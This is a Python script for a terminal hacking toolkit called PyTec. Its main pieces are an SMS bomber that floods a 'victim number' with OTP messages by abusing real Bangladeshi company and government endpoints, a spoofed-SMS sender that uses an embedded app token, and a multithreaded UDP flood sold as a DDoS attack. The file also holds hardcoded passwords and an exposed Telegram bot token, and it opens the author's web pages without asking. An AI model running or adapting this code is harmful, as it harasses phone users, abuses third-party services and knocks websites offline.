import os
import time
import requests

# rendom module use kore ans gulu ke sajate pari


try:
    iP = requests.get("http://ip-api.com/json/").json()["query"]
    mk = requests.get("http://ip-api.com/json/").json()["country"]
    if "Bangladesh" not in mk:
       print("\033[1;91m[×] THIS TOOL WORK IN BANGLADESH")
       time.sleep(3)
       exit()
except requests.exceptions.ConnectionError:
    print(f"\033[1;91m[×] Connection Problem, Please Check Your Internet And Run Again")
    time.sleep(3)
    os.system("clear")
    exit()



try:
    import requests
except ImportError:
    print('\n  installing Requests ...\n')
    time.sleep(1)
    os.system('pip install requests')

# try:
#     import pyttsx3
# except ImportError:
#     print('\n  installing pyttsx3 ...\n')
#     time.sleep(1)
#     os.system('pip install pyttsx3')

# try:
#     import pyautogui
# except ImportError:
#     print('\n  installing pyautogui...\n')
#     time.sleep(1)
#     os.system('pip install pyautogui')

try:
    import qrcode
except ImportError:
    print('\n  installing qrcode ...\n')
    time.sleep(1)
    os.system('pip install qrcode')

try:
    import pyshorteners
except ImportError:
    print('\n  installing pyshorteners ...\n')
    time.sleep(1)
    os.system('pip install pyshorteners')


# try:
#     import speech_recognition
# except ImportError:
#     print('\n  installing SpeechRecognition ...\n')
#     time.sleep(1)
#     os.system('pip install SpeechRecognition')
#     pass

def rm():
    com("rm -rf PyTec.py")

# try:
#     import pywhatkit
# except ImportError:
#     print('\n installing pywhatkit...')
#     time.sleep(1)
#     os.system('pip install pywhatkit')


#import pyttsx3
# import speech_recognition as sr
import sys
from os import system as com
from time import sleep as sleep
import time
#import pyautogui as gui
import pyshorteners as st
import random
import json
import  requests as re
# import pywhatkit



#==================for Color Code===============
BLK = "\033[0;30m"
RED = "\033[0;31m"
GRN = "\033[0;32m"
YLW = "\033[0;33m"
BLU = "\033[0;34m"
PRP = "\033[0;35m"
CYN = "\033[0;36m"
WHT = "\033[0;37m"

B_BLK = "\033[1;30m"
B_RED = "\033[1;31m"
B_GRN = "\033[1;32m"
B_YLW = "\033[1;33m"
B_BLU = "\033[1;34m"
B_PRP = "\033[1;35m"
B_CYN = "\033[1;36m"
B_WHT = "\033[1;37m"
t="\t" #for tab
r="\033[1;31m" #for red color  
g="\033[1;32m" #for green color
y="\033[1;33m" #for yellow color
b="\033[1;34m" #for blue color
m="\033[1;35m" #for purple color
c="\033[1;36m" #for cyan color
w="\033[1;37m" #for white color


# Random Function

list1 = [GRN, YLW, BLU, PRP, CYN, WHT]
list2 = [B_GRN, B_YLW, B_BLU, B_PRP, B_CYN, B_WHT]
ran = str(random.choice(list1))
ran2 = str(random.choice(list2))

tim = time.strftime("%H:%M:%S") # current time



#==============animation for============#
def axak(xak):
    for x in xak:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)
def xak(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.010)
def xak2(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)
def animation_ban(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.002)





#++++++++++++++++++++Tools menu++++++++++++++++++
menu_logo = (f"""{ran2}
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                                                       ║
║        ██████╗░██╗░░░██╗████████╗███████╗░█████╗░     ║
║        ██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝██╔══██╗     ║
║        ██████╔╝░╚████╔╝░░░░██║░░░█████╗░░██║░░╚═╝     ║
║        ██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══╝░░██║░░██╗     ║
║        ██║░░░░░░░░██║░░░░░░██║░░░███████╗╚█████╔╝     ║
║        ╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚══════╝░╚════╝░     ║
║                                                       ║
╠═══════════════════════════════════════════════════════╣
║                                                       ║
║   [1] 🚀 MK SMS BOMBER (Updating)                    ║
║   [2] 📷 QR Code Generator                           ║
║   [3] 🔗 URL Shortener                               ║
║   [4] ✉️ Custom SMS (Updating)                       ║
║   [5] 🌐 Web Cloner                                  ║
║   [6] 💥 DDoS Attack                                 ║
║   [0] ❌ Exit                                        ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
""")
com("xdg-open http://mk777.rf.gd/?i=1")













# ==================Only for Banner===================

def pytec():
    com("clear")
    xak(f"""{ran2}
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║                                                       ║
    ║        ██████╗░██╗░░░██╗████████╗███████╗░█████╗░     ║
    ║        ██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝██╔══██╗     ║
    ║        ██████╔╝░╚████╔╝░░░░██║░░░█████╗░░██║░░╚═╝     ║
    ║        ██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══╝░░██║░░██╗     ║
    ║        ██║░░░░░░░░██║░░░░░░██║░░░███████╗╚█████╔╝     ║
    ║        ╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚══════╝░╚════╝░     ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    





def sms_bomber_ban():
    com("clear")
    xak(f"""\n{ran2}
    ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
    ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
    ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
    ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
    ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
    ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ 
    """ )
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝑺𝑴𝑺 𝑩𝒐𝒎𝒃𝒆𝒓                   ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
        """ )
    

def qr_code_ban():
    com("clear")
    xak(f"""\n{ran2}
        
    ╭━━━┳━━━╮╭━━━╮╱╱╱╱╭╮
    ┃╭━╮┃╭━╮┃┃╭━╮┃╱╱╱╱┃┃
    ┃┃╱┃┃╰━╯┃┃┃╱╰╋━━┳━╯┣━━╮
    ┃┃╱┃┃╭╮╭╯┃┃╱╭┫╭╮┃╭╮┃┃━┫
    ┃╰━╯┃┃┃╰╮┃╰━╯┃╰╯┃╰╯┃┃━┫
    ╰━━╮┣╯╰━╯╰━━━┻━━┻━━┻━━╯
    ╱╱╱╰╯
    """ )
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝓠𝓡 𝓒𝓸𝓭𝓮 𝓖𝓮𝓷𝓪𝓻𝓮𝓽𝓸𝓻            ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
        """ )
    
def url_shortener_ban():
    com("clear")
    xak(f"""\n{ran2}
    
    ╔╗ ╔╗ ╔╗   ╔═══╦╗      ╔╗
    ║║ ║║ ║║   ║╔═╗║║     ╔╝╚╗
    ║║ ║╠═╣║   ║╚══╣╚═╦══╦╩╗╔╬══╦═╗
    ║║ ║║╔╣║ ╔╗╚══╗║╔╗║╔╗║╔╣║║║═╣╔╝
    ║╚═╝║║║╚═╝║║╚═╝║║║║╚╝║║║╚╣║═╣║
    ╚═══╩╝╚═══╝╚═══╩╝╚╩══╩╝╚═╩══╩╝
    """)
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝐔𝐫𝐋 𝐒𝐡𝐨𝐫𝐭𝐞𝐫                    ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                    ║
    ╚════════════════════════════════════════════════════╝
        """ )

def custom_sms_ban():
    com("clear")
    xak(f"""\n{ran2}
        
    ╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━━┳━╮╭━┳━━━╮
    ┃╭━╮┃╱╱╱╱╭╯╰╮╱╱╱╱╱╱┃╭━╮┃┃╰╯┃┃╭━╮┃
    ┃┃╱╰╋╮╭┳━┻╮╭╋━━┳╮╭╮┃╰━━┫╭╮╭╮┃╰━━╮
    ┃┃╱╭┫┃┃┃━━┫┃┃╭╮┃╰╯┃╰━━╮┃┃┃┃┃┣━━╮┃
    ┃╰━╯┃╰╯┣━━┃╰┫╰╯┃┃┃┃┃╰━╯┃┃┃┃┃┃╰━╯┃
    ╰━━━┻━━┻━━┻━┻━━┻┻┻╯╰━━━┻╯╰╯╰┻━━━╯
    """)
    animation_ban(f"""{ran}
    ╔═════════════════════════════════════════════════╗
    ║                                                 ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★    ║
    ║  🔧  TOOLS      ➟  𝓒𝓾𝓼𝓽𝓸𝓶 𝓢𝓜𝓢                ║
    ║  🛠️  VERSION    ➟  V 1.0                      ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1    ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
        """ )

def web_cloner_ban():
    com("clear")
    xak(f"""\n{ran2}
        
    ╭╮╭╮╭╮╱╱╭╮╱╭━━━┳╮
    ┃┃┃┃┃┃╱╱┃┃╱┃╭━╮┃┃
    ┃┃┃┃┃┣━━┫╰━┫┃╱╰┫┃╭━━┳━╮╭━━┳━╮
    ┃╰╯╰╯┃┃━┫╭╮┃┃╱╭┫┃┃╭╮┃╭╮┫┃━┫╭╯
    ╰╮╭╮╭┫┃━┫╰╯┃╰━╯┃╰┫╰╯┃┃┃┃┃━┫┃
    ╱╰╯╰╯╰━━┻━━┻━━━┻━┻━━┻╯╰┻━━┻╯
    """)
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝓦𝓮𝓫 𝓒𝓵𝓸𝓷𝓮𝓻                  ║
    ║  🛠️  VERSION    ➟  V 1.0                        ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1      ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
        """ )

def ddos_attack_ban():
    com("clear")
    xak(f"""\n {ran2}
        
    ██████╗░██████╗░░█████╗░░██████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
    ██║░░██║██║░░██║██║░░██║╚█████╗░
    ██║░░██║██║░░██║██║░░██║░╚═══██╗
    ██████╔╝██████╔╝╚█████╔╝██████╔╝
    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
        """)
    animation_ban(f"""{ran}
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★     ║
    ║  🔧  TOOLS      ➟  𝐀𝐔𝐓𝐎 𝐃𝐃𝐨𝐒 𝐛𝐲 𝐏𝐲𝐓𝐞𝐜🔥          ║
    ║  🛠️  VERSION    ➟  V 1.0                        ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1      ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
        """ )
    
          







#===================BOMBER TOOLS=======================

def sms_bomber():
  com("clear")
  sms_bomber_ban()
  xak(f"{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐞𝐢𝐧𝐠 𝐮𝐩𝐝𝐚𝐭𝐞𝐝.")
  xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
  menu()
  print(WHT+"[~] please wait Internet checking...  ")
  time.sleep(2)
  try:
    iP = requests.get("http://ip-api.com/json/").json()["query"]
    mk = requests.get("http://ip-api.com/json/").json()["country"]
    if "Bangladesh" not in mk:
       print("\033[1;91m[×] THIS TOOL WORK IN BANGLADESH")
       time.sleep(3)
       exit()
  except requests.exceptions.ConnectionError:
    print(f"\033[1;91m[×] Connection Problem, Please Check Your Internet And Run Again")
    time.sleep(3)
    com("clear")
    exit()
  com('clear')
  print(WHT+"[~] Connecting To The Internet")
  time.sleep(0.30)
  print(f"\n{r}Note : {WHT}1 Sms Can Sent Up To 18 sms !!")
  try:
   request = requests.get("https://www.google.com/", timeout=2)
   print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connetcted ")
  except (requests.ConnectionError, requests.Timeout) as exception:
   print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
  number=input(f"{c}\n[ VICTIM NUMBER ] :{WHT} +88")
  amount=int(input(c+"\n[ AMOUNT ] : "+WHT))
  xak(f"\n\n\t {WHT}<{r}/{WHT}> {g}STAY WITH Mk-777 ;) {WHT}<{r}/{WHT}>\n\n")
  input(f"\t\t\t{r}Press Enter....")
  com("clear")
  url0 = "http://apibeta.iqra-live.com/api/v1/sent-otp/"+number
  urlf = "https://da-api.robi.com.bd/da-nll/otp/send"
  headersf = {
              "Host": "da-api.robi.com.bd",
              "Connection": "keep-alive",
              "Content-Length": "24",
              "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
              "Accept": "application/json, text/plain, */*",
              "Content-Type": "application/json",
              "sec-ch-ua-mobile": "?1",
              "User-Agent": "Mozilla/5.0 (Linux; Android 11; Phh-Treble vanilla Build/RQ3A.211001.001;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Safari/537.36",
              "sec-ch-ua-platform": '"Android"',
              "Origin": "https://onlinesim.robi.com.bd",
              "X-Requested-With": "mark.via.gp",
              "Sec-Fetch-Site": "same-site",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Dest": "empty",
              "Referer": "https://onlinesim.robi.com.bd/",
              "Accept-Encoding": "gzip, deflate, br, zstd",
              "Accept-Language": "en-US,en;q=0.9",
          }
  dataf= {"msisdn": number}
  
  
  random_alphabet = random.choice('abcdefghijklmnopqrstuvwxyz')
  urlg = "https://meenabazardev.com/api/front/send/otp"
  headersg = ({
              "Host": "meenabazardev.com",
              "accept": "*/*",
              "access-control-request-method": "POST",
              "access-control-request-headers": "authorization,content-type,token",
              "origin": "https://meenabazaronline.com",
              "user-agent": "Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.45 Mobile Safari/537.36",
              "sec-fetch-mode": "cors",
              "x-requested-with": "mark.via.gp",
              "sec-fetch-site": "cross-site",
              "sec-fetch-dest": "empty",
              "referer": "https://meenabazaronline.com/",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US,en;q=0.9",
              "Content-Type": "application/json",
          })
  datag = json.dumps({
              "CellPhone": number,
              "type": random_alphabet
          })
  
  urlgov = "https://training.gov.bd/backoffice/api/user/sendOtp"
  
  hedagov = {
              "Host": "training.gov.bd",
              "Connection": "keep-alive",
              "Content-Type": "application/json",
              "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
              "Origin": "https://training.gov.bd",
              "Referer": "https://training.gov.bd/signup",
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"
          }
  datagov = json.dumps({
              "mobile": number
          })
  
  
  urlshop = 'https://eshop-api.banglalink.net/api/v1/customer/send-otp'
  hedashop = {
              'Host': 'eshop-api.banglalink.net',
              'Connection': 'keep-alive',
              'Content-Length': '38',
              'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
              'sec-ch-ua-platform': '"Android"',
              'sec-ch-ua-mobile': '?1',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
              'Content-Type': 'application/json',
              'Accept': '*/*',
              'Origin': 'https://eshop.banglalink.net',
              'X-Requested-With': 'mark.via.gp',
              'Sec-Fetch-Site': 'same-site',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              'Referer': 'https://eshop.banglalink.net/',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US,en;q=0.9',
          }
  datashop = json.dumps({
              'type': 'phone',
              'phone': number
          })
  
  com("xdg-open https://www.facebook.com/profile.php?id=100077752513671")
  print(f"""\n{ran2}                                                               
  $$\\      $$\\ $$\\   $$\\       $$$$$$$\\   $$$$$$\\  $$\\      $$\\ $$$$$$$\\  
  $$$\\    $$$ |$$ | $$  |      $$  __$$\\ $$  __$$\\ $$$\\    $$$ |$$  __$$\\ 
  $$$$\\  $$$$ |$$ |$$  /       $$ |  $$ |$$ /  $$ |$$$$\\  $$$$ |$$ |  $$ |
  $$\\$$\\$$ $$ |$$$$$  /        $$$$$$$\\ |$$ |  $$ |$$\\$$\\$$ $$ |$$$$$$$\\ |
  $$ \\$$$  $$ |$$  $$<         $$  __$$\\ $$ |  $$ |$$ \\$$$  $$ |$$  __$$\\ 
  $$ |\\$  /$$ |$$ |\\$$\\        $$ |  $$ |$$ |  $$ |$$ |\\$  /$$ |$$ |  $$ |
  $$ | \\_/ $$ |$$ | \\$$\\       $$$$$$$  | $$$$$$  |$$ | \\_/ $$ |$$$$$$$  |
  \\__|     \\__|\\__|  \\__|      \\_______/  \\______/ \\__|     \\__|\\_______/ 
    """)
  print(f"\n\t      {ran},----------------------------------,")
  print(f"\t{WHT}      | {RED}    AMOUNT ({g}{amount}{RED}){WHT} |   {RED}   TIME       {WHT}|")
  print(f"\t      {ran}'----------------------------------'")
  for i in range(amount):
    respf = requests.post(urlf, headers=headersf, json=dataf)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    respg = requests.post(urlg, headers=headersg, json=datag)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    resp0 = requests.get(url0)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    respgov = requests.post(urlgov, headers=hedagov, json=datagov)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    respshop = requests.post(urlshop, headers=hedashop, json=datashop)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)

  else: 
    input(g+"\n\n\t\t\tYour Pogram Finished Press Enter For Continue")
    





def qr_code():
    com("clear")
    qr_code_ban()

    name = input(f"{ran2}Type QRCode Name: ")
    data = input(f"{ran2}Type Data For Generate QRCode: ")

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=20,
        border=7,
    )
    qr.add_data(data)
    qr.make(fit=True)
    make = qr.make_image(fill="green", back_color="lightgreen")
    make.save(f'{name}--PyTec.png')
    print(f"Your input Data:> {data}")
    print("Successfully saved")
    input("\n\n\t\t\tYour Program Finished. Press Enter To Continue")
    com("clear")
    qr_code()





def url_shortner():
    com("clear")
    url_shortener_ban()

    try:
        urlshort = input(str("ℙ𝕒𝕤𝕥 𝕐𝕠𝕦𝕣 𝕌𝕣𝕝 ℍ𝕖𝕣𝕖 : "))
        if not urlshort.startswith("http://") and not urlshort.startswith("https://"):
            print(f"{r}Invalid URL! Please include 'http://' or 'https://'.")
            return

        shorturl = st.Shortener().tinyurl.short(urlshort)
        print(f"\n{g}𝘠𝘰𝘶𝘳 𝘚𝘩𝘰𝘳𝘵 𝘜𝘳𝘭 𝘏𝘦𝘳𝘦: {shorturl}")
    except Exception as e:
        print(f"{r}An error occurred: {e}")
    finally:
        input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
        com("clear")
        url_shortner()




def custom_sms():
    com("clear")
    custom_sms_ban()
    xak(f"{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐞𝐢𝐧𝐠 𝐮𝐩𝐝𝐚𝐭𝐞𝐝.")
    xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
    menu()

    urlsms = "https://badhan-api.stylezworld.net/api/otp/store"
    headers = {
        "user-agent": "Dart/3.1 (dart:io)",
        "access-control-allow-credentials": "true",
        "access-control-allow-headers": "Origin,Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,locale",
        "accept": "application/json",
        "access-control-allow-origin": "*",
        "access-control-allow-methods": "POST, OPTIONS",
        "accept-encoding": "gzip",
        "app-access-token": "mWR+64IbKwxM2XCyJbMvUSCcc=",
        "content-type": "application/json; charset=utf-8",
    }

    while True:
        numsms = str(input(f"\n{g}Enter Victime Number \n \n{WHT}NUMBER {r}=>{y} "))
        sms = str(input(f"\n{g}Write Message \n \n{WHT}MESSEGE {r}=>{y} "))
        data = {
            "phone_number": numsms,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
            "registration_phone_number": numsms,
            "auto_fill": sms
        }
        response = requests.post(urlsms, headers=headers, json=data)
        print("\n", response.json(), "\n\n")
        input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
        com("clear")
        url_shortner()




def web_clone():
    com("clear")
    web_cloner_ban()

    url = input("𝐄𝐧𝐭𝐞𝐫 𝐔𝐫𝐥 𝐎𝐟 𝐓𝐚𝐫𝐠𝐞𝐭 𝐖𝐞𝐛𝐬𝐢𝐭𝐞: ")
    response = re.get(url)

    html = response.text
    css = response.text
    javascript = response.text
    print(html)
    print(css)
    print(javascript)
    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
    com("clear")
    web_clone()





def ddos():
    com("clear")
    ddos_attack_ban()
    xak(f"""\n{ran2} 𝐈 𝐡𝐚𝐯𝐞 𝐭𝐰𝐨 𝐃𝐃𝐎𝐒 𝐭𝐨𝐨𝐥𝐬. 𝐒𝐞𝐥𝐞𝐜𝐭 𝐭𝐡𝐞 𝐭𝐨𝐨𝐥 𝐲𝐨𝐮 𝐩𝐫𝐞𝐟𝐞𝐫. 
            [𝟏] 𝐌𝐞𝐝𝐢𝐮𝐦 𝐋𝐞𝐯𝐞𝐥
            [𝟐] 𝐇𝐢𝐠𝐡 𝐋𝐞𝐯𝐞𝐥
        """)
    choice = input(f"{ran2}Select Option: ")
    if choice == "1":
        ddos_midium()
    elif choice == "2":
        ddos_high()
    else:
        print(f"{r}Invalid choice. Please select 1 or 2.")
        ddos()
    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")






def ddos_midium():
    com("clear")
    import os
    import socket
    import threading
    import random
    import time
    from urllib.parse import urlparse
    from datetime import datetime

    # 🌈 Colors
    red = "\033[91m"
    green = "\033[92m"
    cyan = "\033[96m"
    yellow = "\033[93m"
    reset = "\033[0m"

    def loading(message, dots=3, delay=0.4):
        print(f"{yellow}{message}", end="", flush=True)
        for _ in range(dots):
            print(".", end="", flush=True)
            time.sleep(delay)
        print(reset)

    # 🔰 Clear & Banner
    os.system("clear" if os.name == "posix" else "cls")
    ddos_attack_ban()

    # 🌐 Step 1: Input website
    target_url = input(f"{cyan}[?] Enter Website URL (e.g., https://example.com): {reset}")
    loading("Parsing URL")

    # 🌍 Step 2: Extract domain and get IP
    domain = urlparse(target_url).netloc or urlparse(target_url).path
    loading(f"Resolving IP for {domain}")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{green}[+] Target IP: {ip}{reset}")
    except Exception as e:
        print(f"{red}[!] Failed to resolve IP: {e}{reset}")
        exit()

    # 🔌 Step 3: Detect Port
    default_port = 443 if "https" in target_url else 80
    print(f"{green}[+] Using Port: {default_port}{reset}")
    time.sleep(1)

    # 🧠 Step 4: User config
    threads = int(input(f"{cyan}[?] Number of Threads (Recommended: 100): {reset}"))
    loading("Starting attack engine")

    # 💥 DDoS Attack + Live Counter
    attack_counter = 0
    lock = threading.Lock()
    start_time = datetime.now()

    def attack():
        global attack_counter
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                s.sendto(data, (ip, default_port))
                with lock:
                    attack_counter += 1
            except Exception:
                break

    def live_status():
        while True:
            time.sleep(1)
            elapsed = datetime.now() - start_time
            with lock:
                print(f"{cyan}[~] Sent packets: {attack_counter} | Time Elapsed: {elapsed.seconds}s{reset}", end="\r",
                      flush=True)

    print(f"{red}[*] Attacking {ip}:{default_port} with {threads} threads!{reset}")
    time.sleep(1)

    status_thread = threading.Thread(target=live_status, daemon=True)
    status_thread.start()

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()



def ddos_high():
    ddos_attack_ban()
    animation_ban(f"{ran} 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐚 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐭𝐨𝐨𝐥. 𝐈𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐩𝐨𝐬𝐬𝐢𝐛𝐥𝐞 𝐭𝐨 𝐫𝐮𝐧 𝐭𝐡𝐢𝐬 𝐭𝐨𝐨𝐥 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧. 𝐈𝐟 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭, 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐫𝐞𝐚𝐭𝐨𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐭𝐨𝐨𝐥.")
    animation_ban(f"{ran} 𝐈 𝐜𝐚𝐧 𝐡𝐞𝐥𝐩 𝐲𝐨𝐮 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐫𝐞𝐚𝐭𝐨𝐫. 𝐀𝐫𝐞 𝐲𝐨𝐮 𝐢𝐧𝐭𝐞𝐫𝐞𝐬𝐭𝐞𝐝 𝐢𝐧 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐢𝐧𝐠?")
    choice = input(f"{ran2}Do you want to contact the creator? (y/n): ")
    if choice.lower() == 'y':
        print(f"{ran2}Contacting the creator...")
        time.sleep(2)
        com("xdg-open http://mk777.rf.gd/?i=1")
    else:
        print(f"{ran2}Exiting...")
        time.sleep(1)
        menu()

    




    





def menu():
    anim(menu_logo)
    sel = input(f"{ran2}[>]select option:")
    if sel == '1':
        sms_bomber()
    elif sel == '2':
        qr_code()
    elif sel == '3':
        url_shortner()
    elif sel == '4':
        custom_sms()
    elif sel == '5':
        web_clone()
    elif sel == '6':
        ddos()
    elif sel in "0":
        sys.exit()




# listener = sr.Recognizer()

# try:
#     with sr.Microphone() as mic:
#         print("Listening...")
#         voice = listener.listen(mic)
#         command = listener.recognize_google_cloud(voice)
#         print(command)
# except:
#     pass



def anim(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)



# asis = pyttsx3.init()
# wait = asis.runAndWait()
# voices = asis.getProperty('voices')
# rob = asis.setProperty("voice", voices[1].id)




users = {
    "admin": "Mk-777",
    "user1": "MuslimUddinMk",
    "test": "op"
}


pytec()
username = input(f"{B_CYN}🧑 Username ➤ ")
password = input(f"{B_CYN}🔒 Password ➤ ")

if username in users and users[username] == password:
    print(f"\n{B_GRN}✅ Welcome {username}! Login successful 🎉\n")
else:
    print(f"{B_RED}❗️ Login failed! Incorrect username or password. Exiting...")
    exit()












bot_token = '7903954184:AAF4MyCznsMtDeXC8G_DaopvX66I6qnb_R0'
